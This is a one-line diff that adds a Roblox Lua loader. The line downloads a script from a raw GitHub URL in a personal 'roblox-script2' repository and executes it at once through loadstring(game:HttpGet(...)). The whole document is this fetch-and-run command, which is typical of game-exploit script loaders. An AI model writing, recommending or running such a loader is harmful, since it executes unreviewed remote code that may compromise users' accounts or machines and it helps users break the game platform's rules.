@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sashagavrilchuk1-eng/roblox-script2/refs/heads/main/projection_sorcer.lua"))()
